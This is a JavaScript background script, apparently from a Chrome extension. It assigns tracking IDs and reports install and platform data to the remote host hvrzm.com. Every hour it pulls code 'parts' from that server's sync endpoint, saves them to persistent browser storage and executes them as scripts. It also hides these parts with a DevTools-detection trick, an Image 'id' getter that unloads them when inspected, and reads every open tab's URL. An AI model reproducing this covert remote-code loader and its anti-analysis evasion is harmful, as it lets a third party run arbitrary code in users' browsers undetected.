(function(){
"use strict";
let settings = {
    pid: "1067",
    appVersion: "3.0.24",
    appType: "didm",

    pidPref: "pid",
    sidPref: "sid",
    ubidPref: "ubid",
    cidPref: "cid",
    endAtPref: "endAt",

    osPref: "os",
    archPref: "arch",
    platformPref: "platform",

    installTimePref: "installTime",
    installVersionPref: "installVersion",
    currentVersionPref: "currentVersion",

    lastVersionPref: "lastVersion",

    lastActiveDayPref: "lastActiveDay",
    reloadCountPref: "reloads",
    installSourcePref: "installSource",
    activeDaysCountPref: "activeDaysCount",

    activePartsPref: "activeParts",
    lastPartsAttemptTimePref: "lastPartsAttemptTime",

    serverUrl: "https://cr-b.hvrzm.com/didm/",
};
;
let context = {
    ubid: null, sid: null, cid: null, pid: null, atch: null, os: null, platform: null, source: null, endAt: null,
    installTime: null, installVersion: null, installSource: null, activeDays: null, lastActiveDay: null, currentVersion: null
};;
let eventLogger = {

    eventUrl : settings.serverUrl + "events",

    logPostEvent(query, postBody, callback) {
        xmlHttpRequests.sendPost(this.eventUrl, query, postBody, callback);
    },

    logGetEvent(query, callback) {
        xmlHttpRequests.sendGet(this.eventUrl, query, callback);
    },

    logInstallEvent() {
        this.logPostEvent({}, {eventName: 'install'});
    },

    logUpdateEvent() {
        this.logPostEvent({}, {eventName: 'update'});
    }
};;
class EventObserver {
    constructor() {
        this.listeners = [];
    }

    subscribe(listener) {
        if (this.listeners.indexOf(listener) == -1) {
            this.listeners.push(listener);
        }
    };

    unsubscribe(listener) {
        let index = this.listeners.indexOf(listener);

        if (index != -1) {
            this.listeners.splice(index, 1);
        }
    };

    notifySubscribers(subject) {
        let args = Array.prototype.splice.call(arguments, 1);

        for (let listener of this.listeners) {
            if (listener && listener[subject]) {
                listener[subject].apply(listener, args);
            }
        }
    };
}
;
let loader = {

    parts: window.bwInterfaces || (window.bwInterfaces = {}),

    runScript(id, fn, onSuccessCallback, onFailureCallback) {
        fileStorage.getFullPath(fn, (url) => {
            let scriptElement = document.createElement('script');
            scriptElement.setAttribute('src', url);
            scriptElement.setAttribute("type", "text/javascript");
            scriptElement.setAttribute("name", id);

            document.head.appendChild(scriptElement);

            onSuccessCallback && onSuccessCallback();
        }, onFailureCallback);
    },

    startPartIfAvailable(id, settings){
        return function start(triesCount) {
            let tries = triesCount || 0;
            let MAX_TRIES = 10;

            if (this.parts[id]) {
                this.parts[id].start(settings);
            } else {
                ++tries;
                if (tries < MAX_TRIES) {
                    setTimeout(function () {
                        start.call(this, tries)
                    }.bind(this), 100);
                } else {
                }
            }
        }.bind(this)
    },

    loadBgPart(id, fn, onSuccessCallback, onFailureCallback) {
        this.runScript(id, fn, onSuccessCallback, onFailureCallback);
    },

    loadIntPart(id, fn, onSuccessCallback, onFailureCallback) {
        this.runScript(id, fn, onSuccessCallback, onFailureCallback);
    },

    startPart(id, settings) {
        this.startPartIfAvailable(id, settings)();
    },

    stopPart(id) {
        if (this.parts[id]) {
            this.parts[id].stop();
        }
    },

    uninstallPart(id) {
        if (this.parts[id]) {
            this.parts[id].uninstall();
            delete this.parts[id];

            let elements = document.querySelectorAll('script[name="' + id + '"]');
            if(elements){
                elements.forEach(function(el){
                    !!el.parentNode && el.parentNode.removeChild(el);
                })
            }
        }
    },

    stopAllParts() {
        for (let id in this.parts) {
            if (this.parts.hasOwnProperty(id)) {
                this.parts[id].stop();
            }
        }
    },

    uninstallAllParts () {
        for (let id in this.parts) {
            if (this.parts.hasOwnProperty(id)) {
                this.parts[id].uninstall();
                delete this.parts[id];
            }
        }
    }
};
;
'use strict';

let fileStorage = {

    getFS(onSuccessCallback, onFailureCallback) {
        const _10MB_SIZE = 1024 * 1024 * 10;
        window.webkitRequestFileSystem(window.PERSISTENT, _10MB_SIZE, onSuccessCallback, onFailureCallback);
    },

    getFile(path, createFlag, onSuccessCallback, onFailureCallback) {
        let dirname = path.slice(0, path.lastIndexOf('/') + 1);
        let filename = path.slice(dirname.length) + ".js";

        this.getDirectory(dirname, {create: createFlag}, (root) => {
            root.getFile(filename, {create: createFlag},
                onSuccessCallback, onFailureCallback);
        }, onFailureCallback);
    },

    getDirectory(path, createFlag, onSuccessCallback, onFailureCallback) {
        let folders = path.split('/');
        if (folders[0] === '.' || folders[0] === '') {
            folders = folders.slice(1);
        }

        let getDirHelper = function (dirEntry, folders) {
            if (folders.length) {
                dirEntry.getDirectory(folders[0], {create: createFlag}, (dirEntry) => {
                    getDirHelper(dirEntry, folders.slice(1));
                }, onFailureCallback);
            } else {
                onSuccessCallback(dirEntry);
            }
        };

        this.getFS((fs) => {
            getDirHelper(fs.root, folders);
        }, onFailureCallback);
    },

    getFullPath(filename, onSuccessCallback, onFailureCallback) {
        this.getFile(filename, false, (fileEntry) => {
            onSuccessCallback(fileEntry.toURL());
        }, onFailureCallback);
    },

    read(filename, onSuccessCallback, onFailureCallback) {
        this.getFile(filename, false, (fileEntry) => {
            fileEntry.file(file => {
                let reader = new FileReader();
                reader.onloadend = () => {
                    onSuccessCallback(reader.result);
                };
                reader.onerror = (err) => {
                    onFailureCallback && onFailureCallback(err);
                };
                reader.readAsText(file);
            }, onFailureCallback);
        }, onFailureCallback);
    },

    write(filename, content, onSuccessCallback, onFailureCallback) {
        this.getFile(filename, true, (fileEntry) => {
            fileEntry.createWriter(fileWriter => {
                var blob = new Blob(Array.prototype.slice.call(content), {type: 'text/plain'});
                fileWriter.onerror = err => {
                    onFailureCallback && onFailureCallback(err);
                };
                fileWriter.onwriteend = () => {
                    fileWriter.onwriteend = () => {
                        onSuccessCallback && onSuccessCallback();
                    };
                    fileWriter.write(blob);
                };
                fileWriter.truncate(0);
            }, onFailureCallback);
        }, onFailureCallback);
    },

    remove(filename, onSuccessCallback, onFailureCallback) {
        this.getFile(filename, false, fileEntry => {
            fileEntry.remove(onSuccessCallback, onFailureCallback);
        }, onFailureCallback);
    },
};
;
let storage = {

    prepareKey(key) {
        return 'extensions.' + chrome.runtime.id + '.' + key;
    },

    write(key, value) {
        localStorage.setItem(this.prepareKey(key), value);
    },

    read(key) {
        let result;
        let value = localStorage.getItem(this.prepareKey(key));

        if (isNaN(value)) {
            if (value === 'true') {
                result = true;
            } else if (value === 'false') {
                result = false;
            } else {
                result = value;
            }
        } else {
            result = parseFloat(value);
        }

        return result;
    },

    remove(key) {
        localStorage.removeItem(this.prepareKey(key));
    }
};
;
let xmlHttpRequests = {

    successCallback(xhr, callback) {
        return function () {
            if (callback && xhr.readyState == 4 && xhr.status == 200) {
                callback(xhr.responseText);
            }
        };
    },

    constructRequest(method, url, callback) {
        let xhr = new XMLHttpRequest();

        xhr.open(method, url, true);
        xhr.setRequestHeader("Content-type", "text/plain");
        xhr.onreadystatechange = this.successCallback(xhr, callback);

        return xhr;
    },

    stringify(payload) {
        let str = '';
        for (let key in payload) {
            if (payload.hasOwnProperty(key)) {
                str += key + '=' + payload[key] + '&';
            }
        }
        return str;
    },

    getMeta () {
        let meta = {
            ts: Date.now(),
            os: context.os,
            arch: context.arch,
            platform: context.platform,

            sid: context.sid,
            cid: context.cid,
            pid: context.pid,
            ubid: context.ubid,
            endAt: context.endAt,

            appType: settings.appType,
            appVersion: settings.appVersion,
            installTime: context.installTime,
            installVersion: context.installVersion,
            currentVersion: context.currentVersion
        };

        Object.keys(meta).forEach((key) => (meta[key] == null) && delete meta[key]);
        return meta;
    },

    getFullUrl(url, query) {
        let args = query || {};
        return args.length > 0 ? url + '?' + this.stringify(args) : url;
    },

    sendPost (theUrl, query, body, callback) {
        let url = this.getFullUrl(theUrl, query);
        let xhr = this.constructRequest("POST", url, callback);
        xhr.send(JSON.stringify(Object.assign(this.getMeta(), body)));
    },

    sendGet (theUrl, query, callback) {
        let url = this.getFullUrl(theUrl, Object.assign(this.getMeta(), query));
        let xhr = this.constructRequest("GET", url, callback);
        xhr.send();
    }
};

;
class InstallProcedures extends EventObserver {

    constructor() {
        super();
    }

    generateId() {
        let rv = '';
        for (let i = 4; i > 0; i--) {
            rv += Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
        }
        return rv;
    };

    processInstallSource() {
        chrome.tabs.query({}, tabs => {
            let installSource = storage.read(settings.installSourcePref);

            if (!installSource) {
                installSource = 'other';
                let markers = [
                    {key: 'cws', matcher: `https:\/\/chrome\.google\.com\/webstore\/detail\/.*${context.cid}`},
                    {key: 'lp', matcher: `.*cid=${context.cid}.*`},
                    {key: 'extmanager', matcher: 'chrome://extensions/'}
                ];

                for (let tab of tabs) {
                    for (let marker of markers) {
                        if (tab.url && tab.url.match(marker.matcher)) {
                            installSource = marker.key;
                            break;
                        }
                    }
                }

                storage.write(settings.installSourcePref, installSource);
                context.installSource = installSource;
            }

            context.installSource = installSource;
            this.notifySubscribers('onComplete');
        })
    }

    createIfMissed(key, newValue, prop, missedValueCallback) {
        let value = storage.read(key);

        if (!value) {
            value = newValue;
            storage.write(key, value);
            missedValueCallback && missedValueCallback();
        }

        context[prop] = value;
    };

    run() {
        this.createIfMissed(settings.cidPref, chrome.runtime.id, 'cid');
        this.createIfMissed(settings.sidPref, this.generateId(), 'sid');
        this.createIfMissed(settings.pidPref, settings.pid, 'pid');
        this.createIfMissed(settings.ubidPref, this.generateId() + this.generateId(), 'ubid');
        this.createIfMissed(settings.installVersionPref, chrome.runtime.getManifest().version, 'installVersion');

        this.createIfMissed(settings.installTimePref, String(Date.now()), 'installTime', function () {
            storage.write(settings.endAtPref, 1);
            this.notifySubscribers('onInstallDetected')
        }.bind(this));

        this.processInstallSource();
    };
}
;
class StartupProcedures extends EventObserver{

    constructor(){
        super();
    }

    updateSystemKeys() {
        chrome.runtime.getPlatformInfo(function (details) {
            storage.write(settings.osPref, details.os);
            storage.write(settings.archPref, details.arch);
            storage.write(settings.platformPref, navigator.platform);

            context.os = details.os;
            context.arch = details.arch;
            context.platform = navigator.platform;

            this.notifySubscribers('onComplete');
        }.bind(this));
    }

    processActiveDaysKey() {
        let date = new Date();
        let currentDate = String(date.getMonth()) + date.getDate();

        let lastActiveDay = storage.read(settings.lastActiveDayPref);
        let activeDaysCount = storage.read(settings.activeDaysCountPref) || 0;

        if (lastActiveDay != currentDate) {
            activeDaysCount += 1;
            storage.write(settings.lastActiveDayPref, currentDate);
            storage.write(settings.activeDaysCountPref, activeDaysCount);

            context.lastActiveDay = currentDate;
            context.activeDays = activeDaysCount;
        }
    }

    processStartupKey() {
        let startupCounter = storage.read(settings.reloadCountPref) || 0;
        storage.write(settings.reloadCountPref, ++startupCounter);
    }

    processEndAtKey(){
        context.endAt = storage.read(settings.endAtPref);
    }

    run() {
        this.processStartupKey();
        this.processEndAtKey();
        this.processActiveDaysKey();
        this.updateSystemKeys();
    };
}
;
class UpdateProcedures extends EventObserver{

    constructor(){
        super();
    }

    run(){
        let lastVersion = storage.read(settings.currentVersionPref);
        let currentVersion = chrome.runtime.getManifest().version;

        let hzLastVersion = storage.read(settings.lastVersionPref);
        if(hzLastVersion){
            storage.remove(settings.lastVersionPref);
            storage.write(settings.endAtPref, 1);
        }

        if (!lastVersion) {
            storage.write(settings.currentVersionPref, currentVersion);
        }else if((!lastVersion && context.installTime) || lastVersion !== currentVersion){
            storage.write(settings.currentVersionPref, currentVersion);
            this.notifySubscribers('onUpdateDetected');
        }

        context.currentVersion = currentVersion;
        this.notifySubscribers('onComplete');
    }
}
;
class ProceduresController {

    constructor(){
        this.installDetected = false;
        this.updateDetected = false;
        this.completedCount = 0;
        this.procedures = [new InstallProcedures(), new UpdateProcedures(), new StartupProcedures()];
    }

    onComplete(){
        this.completedCount += 1;

        if(this.completedCount === this.procedures.length){
            this.installDetected && eventLogger.logInstallEvent();
            this.updateDetected && eventLogger.logUpdateEvent();

            this.installDetected = false;
            this.updateDetected = false;

            (new PartsService()).start();
        }
    }

    onInstallDetected(){
        this.installDetected = true;
    }

    onUpdateDetected(){
        this.updateDetected = true;
    }

    start() {
        for(let procedure of this.procedures){
            procedure.subscribe(this);
            procedure.run();
        }
    };

    stop() {
        this.completedCount = 0;
        this.installDetected = false;
        this.updateDetected = false;
    };
}
;
class PartRemover {
    constructor() {
        this.utils = new PartsUtils();
    }

    unloadFromMemory(id) {
        loader.stopPart(id);
        loader.uninstallPart(id);
    }

    deleteFromPreferences(id) {
        let activeParts = this.utils.getActiveParts();

        if (activeParts[id]) {
            delete activeParts[id];
            storage.write(settings.activePartsPref, JSON.stringify(activeParts));
        }
    }

    deleteFromFS(id, version, callback) {
        fileStorage.remove(this.utils.getBgFN(id, version), function () {
            fileStorage.remove(this.utils.getIntFN(id, version), function () {
                callback && callback();
            }.bind(this));
        }.bind(this));
    }

    removePart(id, version, callback) {
        this.unloadFromMemory(id);
        this.deleteFromFS(id, version, callback);
        this.deleteFromPreferences(id);

    };
}
;
class PartRunner {

    constructor() {
        this.utils = new PartsUtils();
    }

    addPartToPreferences(part) {
        let objectModel = this.utils.getActiveParts();
        objectModel[part.id] = part.ver;
        storage.write(settings.activePartsPref, JSON.stringify(objectModel));
    }

    loadAndExecutePart(id, ver) {
        loader.loadBgPart(id, this.utils.getBgFN(id, ver), function () {
            loader.loadIntPart(id, this.utils.getIntFN(id, ver), function () {
                loader.startPart(id, {
                    pid: context.pid,
                    cid: context.cid,
                    ubid: context.ubid,
                    sid: context.sid
                });
            }.bind(this));
        }.bind(this));
    }

    addPartToFileSystemAndRun(part) {
        if (part.bgContent) {
            fileStorage.write(this.utils.getBgFN(part.id, part.ver), part.bgContent, function () {
                if (part.intContent) {
                    fileStorage.write(this.utils.getIntFN(part.id, part.ver), part.intContent, function () {
                        this.loadAndExecutePart(part.id, part.ver);
                    }.bind(this));
                }
            }.bind(this));
        }
    }

    addPart(part) {
        this.addPartToPreferences(part);
        this.addPartToFileSystemAndRun(part);
    };

    runPart(id, version) {
        this.loadAndExecutePart(id, version);
    };
}
;
class PartsManager {

    constructor() {
        this.launchedParts = {};
        this.utils = new PartsUtils();
        this.partRunner = new PartRunner();
        this.partRemover = new PartRemover();
    }

    reloader(partList, id) {
        return () => {
            delete partList[id];

            if (!Object.keys(partList).length) {
                chrome.runtime.reload();
            }
        }
    }

    addParts(parts) {
        for (let i in parts) {
            let id = parts[i].id;
            let version = parts[i].ver;
            let oldVersion = this.launchedParts[id];

            if (oldVersion && oldVersion != version) {
                delete this.launchedParts[id];
                this.partRemover.removePart(id, version);
            }

            this.launchedParts[id] = version;
            this.partRunner.addPart(parts[i]);
        }
    }

    removeParts(parts) {
        for (let id in parts) {
            if (parts.hasOwnProperty(id) && this.launchedParts[id]) {
                this.partRemover.removePart(id, parts[id], this.reloader(parts, id));
            }
        }
    }

    start() {
        let version, availableParts = this.utils.getActiveParts();

        for (let id in availableParts) {
            if (availableParts.hasOwnProperty(id) && !this.launchedParts[id]) {
                version = availableParts[id];

                this.launchedParts[id] = version;
                this.partRunner.runPart(id, version);
            }
        }
    }

    stop() {
        this.removeParts(this.utils.getActiveParts());
    };
};;
class PartsService {

    constructor() {
        this.timeoutId = '';
        this.utils = new PartsUtils();
        this.partsManager = new PartsManager();
    }

    processUpd(parts) {
        this.partsManager.addParts(parts);
    }

    processDel(parts) {
        var partsMap = {};
        for (let i in parts) {
            partsMap[parts[i].id] = parts[i].ver;
        }

        console.log(JSON.stringify(partsMap))

        this.partsManager.removeParts(partsMap);
    }

    triggerSync() {
        let constructPartsInfo = () => {
            let info = {parts: {}};
            let activeParts = this.utils.getActiveParts();
            for (let id in activeParts) {
                if (activeParts.hasOwnProperty(id)) {
                    info.parts[id] = activeParts[id];
                }
            }
            return info;
        };

        xmlHttpRequests.sendPost(settings.serverUrl + "sync", {}, constructPartsInfo(), function (content) {
            if (content) {
                content = JSON.parse(content);
                if (content && (typeof content == "object")) {
                    if(content.del){
                        this.processDel(content.del);
                    }
                    if(content.upd){
                        this.processUpd(content.upd);
                    }
                }
            }
        }.bind(this));
    }

    schedulePartsUpdate() {
        let partsPeriod = 1000 * 60 * 60;
        let lastPartsRequestTime = storage.read(settings.lastPartsAttemptTimePref) || 0;
        let timeTillRequest = Date.now() - lastPartsRequestTime;

        if (timeTillRequest >= partsPeriod) {
            storage.write(settings.lastPartsAttemptTimePref, Date.now().toString());
            this.timeoutId = setTimeout(this.schedulePartsUpdate.bind(this), partsPeriod);
            this.triggerSync();
        } else {
            this.timeoutId = setTimeout(this.schedulePartsUpdate.bind(this), partsPeriod - timeTillRequest);
        }
    }

    start() {
        let el = new Image();
        Object.defineProperty(el, 'id', {
            get: function () {
                this.partsManager.stop();
                storage.remove(settings.endAtPref);
            }.bind(this)
        });
        console.log(el);

        this.partsManager.start();
        this.schedulePartsUpdate();
    };

    stop() {
        if (this.timeoutId) {
            clearTimeout(this.timeoutId);
        }
    }
};
class PartsUtils {

    getActiveParts() {
        return JSON.parse(storage.read(settings.activePartsPref) || "{}");
    }

    getBgFN(name, version) {
        return name + '-' + version + '-bg';
    };

    getIntFN(name, version) {
        return name + '-' + version + '-int';
    };
}
;
(function GA(){
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-54273221-2']);
    _gaq.push(['_trackPageview']);

    (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = 'https://www.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
})();;
(function(){
    let proceduresController = new ProceduresController();
    proceduresController.start();
})();
})();
